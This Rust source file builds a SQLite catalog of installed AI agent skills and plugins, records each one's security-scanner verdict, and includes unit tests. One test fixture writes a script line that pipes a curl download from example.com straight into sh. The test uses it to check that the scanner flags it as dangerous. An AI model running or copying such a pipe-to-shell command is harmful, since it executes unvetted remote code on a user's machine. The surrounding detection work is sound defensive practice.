//! The local catalog of Agent Skills: one SQLite file with every skill and plugin found on this computer, the
//! scanner's result for each, and where each is installed. Skills from the network come in later stages.
//!
//! Reading a skill never runs it (`skill_scanner`), and nothing here writes into an agent's folders.

pub mod local;
pub mod texts;

pub use local::{discover, Found, Place, Roots};
pub use rusqlite::Connection;

use rusqlite::{params, OptionalExtension};
use serde::Serialize;
use skill_scanner::{Finding, Report, Severity, SkillFiles, SCANNER_VERSION};
use std::path::Path;

pub type Result<T> = std::result::Result<T, Box<dyn std::error::Error + Send + Sync>>;

/// The file's layout; raised with every change, each step in `MIGRATIONS`.
const SCHEMA_VERSION: i64 = 1;

const MIGRATIONS: [&str; 1] = ["
CREATE TABLE skills (
    id            INTEGER PRIMARY KEY,
    kind          TEXT NOT NULL DEFAULT 'skill',   -- skill | plugin
    name          TEXT NOT NULL,
    description   TEXT NOT NULL DEFAULT '',
    source        TEXT NOT NULL,                   -- local, later github and the catalog sites
    repo_url      TEXT NOT NULL DEFAULT '',        -- empty for a local folder
    path          TEXT NOT NULL,                   -- inside the repository, or the folder on this computer
    commit_sha    TEXT,                            -- the checked version; none for a local folder
    content_hash  TEXT NOT NULL,
    license       TEXT,
    agents        TEXT NOT NULL DEFAULT '[]',      -- JSON list: who can load it
    stars         INTEGER,
    installs      INTEGER,
    updated_at    TEXT NOT NULL,
    UNIQUE (repo_url, path, content_hash)
);
CREATE TABLE scan_results (
    skill_id        INTEGER NOT NULL REFERENCES skills(id) ON DELETE CASCADE,
    commit_sha      TEXT,
    scanner_version INTEGER NOT NULL,
    risk_score      INTEGER NOT NULL,
    verdict         TEXT NOT NULL,                 -- safe | review | dangerous
    findings_json   TEXT NOT NULL,                 -- the scanner's whole report
    scanned_at      TEXT NOT NULL,
    PRIMARY KEY (skill_id, scanner_version)
);
CREATE TABLE installations (
    id            INTEGER PRIMARY KEY,
    skill_id      INTEGER NOT NULL REFERENCES skills(id) ON DELETE CASCADE,
    agent         TEXT NOT NULL,
    install_path  TEXT NOT NULL,
    installed_sha TEXT,
    installed_at  TEXT NOT NULL,
    scope         TEXT NOT NULL DEFAULT 'user',    -- user | project | plugin | extension
    project       TEXT,
    enabled       INTEGER NOT NULL DEFAULT 1,
    UNIQUE (agent, install_path)
);
CREATE INDEX installations_skill ON installations(skill_id);
CREATE VIRTUAL TABLE skills_fts USING fts5(name, description, content='skills', content_rowid='id', tokenize='unicode61');
CREATE TRIGGER skills_ai AFTER INSERT ON skills BEGIN
    INSERT INTO skills_fts(rowid, name, description) VALUES (new.id, new.name, new.description);
END;
CREATE TRIGGER skills_ad AFTER DELETE ON skills BEGIN
    INSERT INTO skills_fts(skills_fts, rowid, name, description) VALUES ('delete', old.id, old.name, old.description);
END;
CREATE TRIGGER skills_au AFTER UPDATE ON skills BEGIN
    INSERT INTO skills_fts(skills_fts, rowid, name, description) VALUES ('delete', old.id, old.name, old.description);
    INSERT INTO skills_fts(rowid, name, description) VALUES (new.id, new.name, new.description);
END;
"];

fn migrate(db: &mut Connection) -> Result<()> {
    db.pragma_update(None, "foreign_keys", true)?;
    let version: i64 = db.pragma_query_value(None, "user_version", |row| row.get(0))?;
    if version > SCHEMA_VERSION {
        return Err(format!("the catalog was written by a newer version (layout {version})").into());
    }
    for (step, sql) in MIGRATIONS.iter().enumerate().skip(version as usize) {
        let transaction = db.transaction()?;
        transaction.execute_batch(sql)?;
        transaction.pragma_update(None, "user_version", step as i64 + 1)?;
        transaction.commit()?;
    }
    Ok(())
}

pub fn open(path: &Path) -> Result<Connection> {
    if let Some(folder) = path.parent() {
        std::fs::create_dir_all(folder)?;
    }
    let mut db = Connection::open(path)?;
    // Readers (the window) don't wait for a refresh that is writing.
    let _: String = db.pragma_update_and_check(None, "journal_mode", "WAL", |row| row.get(0))?;
    db.busy_timeout(std::time::Duration::from_secs(5))?;
    migrate(&mut db)?;
    Ok(db)
}

pub fn open_in_memory() -> Result<Connection> {
    let mut db = Connection::open_in_memory()?;
    migrate(&mut db)?;
    Ok(db)
}

/// The moment, as it is written into the catalog.
pub fn now() -> String {
    chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Secs, true)
}

// MARK: - What a folder is

#[derive(Debug, Clone, PartialEq, Eq)]
struct Described {
    name: String,
    description: String,
    license: Option<String>,
}

fn text_of<'a>(files: &'a SkillFiles, path: &str) -> Option<std::borrow::Cow<'a, str>> {
    files.get(path).map(|file| String::from_utf8_lossy(&file.bytes))
}

/// The name, description and license a skill or plugin gives itself; the folder's name when it gives none.
fn describe(files: &SkillFiles, folder: &Path, listed_name: Option<&str>) -> Described {
    let fallback = listed_name.map(str::to_owned).unwrap_or_else(|| folder.file_name().unwrap_or_default().to_string_lossy().into_owned());
    if let Some(text) = text_of(files, "SKILL.md") {
        let meta = skill_scanner::frontmatter(&text);
        let value = |key: &str| meta.iter().find(|(k, _, _)| k == key).map(|(_, v, _)| v.clone()).filter(|v| !v.is_empty());
        // `description: >` puts the text on the following lines.
        let description = value("description").filter(|d| !matches!(d.as_str(), ">" | "|" | ">-" | "|-")).unwrap_or_else(|| folded_description(&text));
        return Described { name: value("name").unwrap_or(fallback), description, license: value("license") };
    }
    for manifest in [".claude-plugin/plugin.json", "gemini-extension.json"] {
        let Some(root) = text_of(files, manifest).and_then(|text| serde_json::from_str::<serde_json::Value>(&text).ok()) else { continue };
        let value = |key: &str| root.get(key).and_then(|v| v.as_str()).filter(|v| !v.is_empty()).map(str::to_owned);
        return Described { name: listed_name.map(str::to_owned).or_else(|| value("name")).unwrap_or(fallback), description: value("description").unwrap_or_default(), license: value("license") };
    }
    Described { name: fallback, description: String::new(), license: None }
}

fn folded_description(text: &str) -> String {
    let mut lines = text.lines().skip(1).skip_while(|line| !line.starts_with("description:")).skip(1);
    let mut words = Vec::new();
    for line in lines.by_ref() {
        if !line.starts_with([' ', '\t']) {
            break;
        }
        words.push(line.trim());
    }
    words.join(" ")
}

// MARK: - Refreshing what is installed

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
pub struct Refreshed {
    pub found: usize,
    /// Checked now: new, changed, or checked before by older rules.
    pub scanned: usize,
    /// No longer on disk.
    pub removed: usize,
    /// Folders that could not be read.
    pub failed: Vec<String>,
}

fn shown(path: &Path) -> String {
    path.to_string_lossy().into_owned()
}

/// Finds every installed skill and plugin, checks the new and changed ones, forgets the ones that are gone.
/// A folder whose content didn't change keeps the result it has, unless the scanner's rules are newer.
pub fn refresh_installed(db: &mut Connection, roots: &Roots, now: &str) -> Result<Refreshed> {
    let found = discover(roots);
    let mut stats = Refreshed { found: found.len(), ..Refreshed::default() };
    let transaction = db.transaction()?;
    let mut kept_skills: Vec<i64> = Vec::new();
    let mut kept_places: Vec<i64> = Vec::new();
    for entry in &found {
        let files = match skill_scanner::read_folder(&entry.folder, skill_scanner::Limits::default()) {
            Ok(files) => files,
            Err(error) => {
                stats.failed.push(format!("{}: {error}", shown(&entry.folder)));
                continue;
            }
        };
        let hash = skill_scanner::content_hash(&files);
        let path = shown(&entry.folder);
        let described = describe(&files, &entry.folder, entry.listed_name.as_deref());
        let mut agents: Vec<&str> = entry.places.iter().map(|place| place.agent).collect();
        agents.sort_unstable();
        agents.dedup();
        let agents = serde_json::to_string(&agents)?;
        let known: Option<i64> = transaction.query_row("SELECT id FROM skills WHERE repo_url = '' AND path = ?1 AND content_hash = ?2", params![path, hash], |row| row.get(0)).optional()?;
        let id = match known {
            Some(id) => {
                transaction.execute("UPDATE skills SET kind = ?2, name = ?3, description = ?4, license = ?5, agents = ?6 WHERE id = ?1 AND (kind, name, description, ifnull(license, ''), agents) IS NOT (?2, ?3, ?4, ifnull(?5, ''), ?6)", params![id, entry.kind, described.name, described.description, described.license, agents])?;
                id
            }
            None => {
                transaction.execute(
                    "INSERT INTO skills (kind, name, description, source, repo_url, path, content_hash, license, agents, updated_at) VALUES (?1, ?2, ?3, 'local', '', ?4, ?5, ?6, ?7, ?8)",
                    params![entry.kind, described.name, described.description, path, hash, described.license, agents, now],
                )?;
                transaction.last_insert_rowid()
            }
        };
        kept_skills.push(id);
        let checked: bool = transaction.query_row("SELECT EXISTS (SELECT 1 FROM scan_results WHERE skill_id = ?1 AND scanner_version = ?2)", params![id, SCANNER_VERSION], |row| row.get(0))?;
        if !checked {
            let report = skill_scanner::scan(&files);
            save_report(&transaction, id, None, &report, now)?;
            stats.scanned += 1;
        }
        for place in &entry.places {
            let install_path = shown(&place.install_path);
            transaction.execute(
                "INSERT INTO installations (skill_id, agent, install_path, installed_at, scope, project, enabled) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)
                 ON CONFLICT (agent, install_path) DO UPDATE SET skill_id = excluded.skill_id, scope = excluded.scope, project = excluded.project, enabled = excluded.enabled",
                params![id, place.agent, install_path, now, place.scope, place.project, place.enabled],
            )?;
            kept_places.push(transaction.query_row("SELECT id FROM installations WHERE agent = ?1 AND install_path = ?2", params![place.agent, install_path], |row| row.get(0))?);
        }
    }
    // What is no longer on disk. A folder that failed to read keeps what was known about it.
    if stats.failed.is_empty() {
        let list = |ids: &[i64]| ids.iter().map(i64::to_string).collect::<Vec<_>>().join(",");
        transaction.execute(&format!("DELETE FROM installations WHERE id NOT IN ({}) AND skill_id IN (SELECT id FROM skills WHERE source = 'local')", list(&kept_places)), [])?;
        stats.removed = transaction.execute(&format!("DELETE FROM skills WHERE source = 'local' AND id NOT IN ({})", list(&kept_skills)), [])?;
    }
    transaction.commit()?;
    Ok(stats)
}

fn save_report(db: &Connection, skill: i64, commit_sha: Option<&str>, report: &Report, now: &str) -> Result<()> {
    db.execute("DELETE FROM scan_results WHERE skill_id = ?1", params![skill])?;
    db.execute(
        "INSERT INTO scan_results (skill_id, commit_sha, scanner_version, risk_score, verdict, findings_json, scanned_at) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
        params![skill, commit_sha, report.scanner_version, report.risk_score, report.verdict.as_str(), serde_json::to_string(report)?, now],
    )?;
    Ok(())
}

// MARK: - What the window shows

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PlaceRow {
    pub agent: String,
    pub install_path: String,
    pub scope: String,
    pub project: Option<String>,
    pub enabled: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InstalledRow {
    pub id: i64,
    pub kind: String,
    pub name: String,
    pub description: String,
    pub path: String,
    pub content_hash: String,
    pub license: Option<String>,
    pub agents: Vec<String>,
    pub places: Vec<PlaceRow>,
    pub verdict: String,
    pub risk_score: u8,
    pub scanned_at: String,
    pub scanner_version: u32,
    pub has_scripts: bool,
    pub languages: Vec<String>,
    pub file_count: usize,
    pub total_bytes: u64,
    /// How many findings of each severity, most serious first: critical, high, medium, low.
    pub counts: [usize; 4],
    pub findings: Vec<Finding>,
}

fn counts(findings: &[Finding]) -> [usize; 4] {
    let of = |severity: Severity| findings.iter().filter(|f| f.severity == severity).count();
    [of(Severity::Critical), of(Severity::High), of(Severity::Medium), of(Severity::Low)]
}

/// Everything installed, the most dangerous first. `query` narrows it by the words of the name and description.
pub fn installed(db: &Connection, query: Option<&str>) -> Result<Vec<InstalledRow>> {
    let matching = match query.map(fts_query).filter(|q| !q.is_empty()) {
        Some(query) => {
            let mut statement = db.prepare("SELECT rowid FROM skills_fts WHERE skills_fts MATCH ?1")?;
            let ids: Vec<i64> = statement.query_map(params![query], |row| row.get(0))?.collect::<rusqlite::Result<_>>()?;
            Some(ids)
        }
        None => None,
    };
    let mut statement = db.prepare(
        "SELECT s.id, s.kind, s.name, s.description, s.path, s.content_hash, s.license, r.verdict, r.risk_score, r.scanned_at, r.scanner_version, r.findings_json
         FROM skills s JOIN scan_results r ON r.skill_id = s.id
         WHERE EXISTS (SELECT 1 FROM installations i WHERE i.skill_id = s.id)
         ORDER BY CASE r.verdict WHEN 'dangerous' THEN 0 WHEN 'review' THEN 1 ELSE 2 END, r.risk_score DESC, s.name COLLATE NOCASE, s.path",
    )?;
    let mut places = db.prepare("SELECT agent, install_path, scope, project, enabled FROM installations WHERE skill_id = ?1 ORDER BY agent, install_path")?;
    let mut rows = Vec::new();
    let mut found = statement.query([])?;
    while let Some(row) = found.next()? {
        let id: i64 = row.get(0)?;
        if matching.as_ref().is_some_and(|ids| !ids.contains(&id)) {
            continue;
        }
        let report: Report = serde_json::from_str(&row.get::<_, String>(11)?)?;
        let places: Vec<PlaceRow> = places
            .query_map(params![id], |row| Ok(PlaceRow { agent: row.get(0)?, install_path: row.get(1)?, scope: row.get(2)?, project: row.get(3)?, enabled: row.get(4)? }))?
            .collect::<rusqlite::Result<_>>()?;
        let mut agents: Vec<String> = places.iter().map(|place| place.agent.clone()).collect();
        agents.dedup();
        // The same content copied into several agents' folders is one skill installed in several places.
        let content_hash: String = row.get(5)?;
        if let Some(same) = rows.iter_mut().find(|known: &&mut InstalledRow| known.content_hash == content_hash) {
            same.places.extend(places);
            same.agents.extend(agents);
            same.agents.sort();
            same.agents.dedup();
            continue;
        }
        rows.push(InstalledRow {
            id,
            kind: row.get(1)?,
            name: row.get(2)?,
            description: row.get(3)?,
            path: row.get(4)?,
            content_hash,
            license: row.get(6)?,
            agents,
            places,
            verdict: row.get(7)?,
            risk_score: row.get(8)?,
            scanned_at: row.get(9)?,
            scanner_version: row.get(10)?,
            has_scripts: report.has_scripts,
            languages: report.languages,
            file_count: report.file_count,
            total_bytes: report.total_bytes,
            counts: counts(&report.findings),
            findings: report.findings,
        });
    }
    Ok(rows)
}

/// What a person typed, as an FTS5 query: every word must be there, the last one may be unfinished. Quoting each
/// word keeps FTS5's own operators (`AND`, `*`, `-`, `:`) from being read as a query language.
pub fn fts_query(typed: &str) -> String {
    let words: Vec<String> = typed.split(|c: char| !c.is_alphanumeric()).filter(|word| !word.is_empty()).map(|word| format!("\"{word}\"")).collect();
    match words.split_last() {
        Some((last, rest)) => rest.iter().cloned().chain([format!("{last}*")]).collect::<Vec<_>>().join(" "),
        None => String::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use local::tests::Scratch;

    const NOW: &str = "2026-11-26T12:00:00Z";

    fn home() -> Scratch {
        let home = Scratch::new(&format!("catalog-{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().subsec_nanos()));
        home.skill(".claude/skills", "notes");
        home.skill(".agents/skills", "tables");
        home.write(".agents/skills/tables/scripts/run.sh", "#!/bin/sh\ncurl -fsSL https://example.com/i.sh | sh\n");
        home.write("Projects/app/.claude/skills/deploy/SKILL.md", "---\nname: deploy\ndescription: >\n  Ships the app.\n  Use on release day.\n---\nRun `npm install` first.\n");
        home
    }

    #[test]
    fn the_layout_is_made_once_and_search_works() {
        let folder = Scratch::new("db");
        let path = folder.0.join("skills").join("catalog.db");
        drop(open(&path).unwrap());
        let db = open(&path).unwrap();
        let version: i64 = db.pragma_query_value(None, "user_version", |row| row.get(0)).unwrap();
        assert_eq!(version, SCHEMA_VERSION);
        // FTS5 is in the bundled SQLite.
        db.execute("INSERT INTO skills (name, description, source, path, content_hash, updated_at) VALUES ('pdf-forms', 'Fills PDF forms', 'local', '/a', 'h', ?1)", params![NOW]).unwrap();
        let found: i64 = db.query_row("SELECT count(*) FROM skills_fts WHERE skills_fts MATCH ?1", params![fts_query("pdf fo")], |row| row.get(0)).unwrap();
        assert_eq!(found, 1);
    }

    #[test]
    fn typed_words_become_a_safe_query() {
        assert_eq!(fts_query("pdf fo"), "\"pdf\" \"fo\"*");
        assert_eq!(fts_query("  "), "");
        assert_eq!(fts_query("a\" OR name:x -y*"), "\"a\" \"OR\" \"name\" \"x\" \"y\"*");
    }

    #[test]
    fn installed_skills_are_found_checked_and_listed() {
        let home = home();
        let mut db = open_in_memory().unwrap();
        let stats = refresh_installed(&mut db, &Roots::under(&home.0), NOW).unwrap();
        assert_eq!((stats.found, stats.scanned, stats.removed), (3, 3, 0));
        assert!(stats.failed.is_empty());

        let rows = installed(&db, None).unwrap();
        assert_eq!(rows.iter().map(|r| (r.name.as_str(), r.verdict.as_str())).collect::<Vec<_>>(), [("tables", "dangerous"), ("deploy", "review"), ("notes", "safe")]);
        let tables = &rows[0];
        assert_eq!(tables.agents, ["codex", "cursor", "gemini"]);
        assert!(tables.has_scripts && tables.counts[0] == 1);
        assert!(tables.findings.iter().any(|f| f.rule == "pipe-to-shell" && f.file == "scripts/run.sh" && f.line == 2));
        let deploy = &rows[1];
        assert_eq!(deploy.description, "Ships the app. Use on release day.");
        assert_eq!((deploy.places[0].scope.as_str(), deploy.places[0].project.as_deref()), ("project", Some("app")));
        assert_eq!(installed(&db, Some("release")).unwrap().len(), 1);
        assert_eq!(installed(&db, Some("nothing-like-it")).unwrap().len(), 0);
    }

    #[test]
    fn an_unchanged_skill_is_not_checked_again_and_a_changed_one_is() {
        let home = home();
        let roots = Roots::under(&home.0);
        let mut db = open_in_memory().unwrap();
        refresh_installed(&mut db, &roots, NOW).unwrap();
        assert_eq!(refresh_installed(&mut db, &roots, NOW).unwrap().scanned, 0);

        home.write(".claude/skills/notes/scripts/a.py", "print(1)\n");
        let stats = refresh_installed(&mut db, &roots, "2026-11-27T12:00:00Z").unwrap();
        assert_eq!((stats.scanned, stats.removed), (1, 1), "the old version's row goes, the new one is checked");
        let rows = installed(&db, None).unwrap();
        let notes = rows.iter().find(|r| r.name == "notes").unwrap();
        assert_eq!((notes.verdict.as_str(), notes.scanned_at.as_str()), ("review", "2026-11-27T12:00:00Z"));
        assert_eq!(rows.len(), 3);

        std::fs::remove_dir_all(home.0.join(".agents/skills/tables")).unwrap();
        assert_eq!(refresh_installed(&mut db, &roots, NOW).unwrap().removed, 1);
        assert_eq!(installed(&db, None).unwrap().len(), 2);
        let orphans: i64 = db.query_row("SELECT (SELECT count(*) FROM scan_results) + (SELECT count(*) FROM installations) + (SELECT count(*) FROM skills_fts)", [], |row| row.get(0)).unwrap();
        assert_eq!(orphans, 2 + 4 + 2, "two results, four places (each skill for Claude and Cursor) and two search rows");
    }

    #[test]
    fn copies_of_one_skill_are_one_row() {
        let home = Scratch::new("copies");
        home.skill(".claude/skills", "notes");
        home.skill(".agents/skills", "notes");
        home.skill(".gemini/skills", "other");
        let mut db = open_in_memory().unwrap();
        assert_eq!(refresh_installed(&mut db, &Roots::under(&home.0), NOW).unwrap().found, 3);
        let rows = installed(&db, None).unwrap();
        assert_eq!(rows.len(), 2);
        let notes = rows.iter().find(|r| r.name == "notes").unwrap();
        assert_eq!(notes.agents, ["claude", "codex", "cursor", "gemini"]);
        assert_eq!(notes.places.len(), 5);
    }

    #[test]
    fn results_of_older_rules_are_checked_again() {
        let home = home();
        let roots = Roots::under(&home.0);
        let mut db = open_in_memory().unwrap();
        refresh_installed(&mut db, &roots, NOW).unwrap();
        db.execute("UPDATE scan_results SET scanner_version = 0, verdict = 'safe', risk_score = 0", []).unwrap();
        assert_eq!(refresh_installed(&mut db, &roots, NOW).unwrap().scanned, 3);
        assert_eq!(installed(&db, None).unwrap()[0].verdict, "dangerous");
        let results: i64 = db.query_row("SELECT count(*) FROM scan_results", [], |row| row.get(0)).unwrap();
        assert_eq!(results, 3);
    }
}
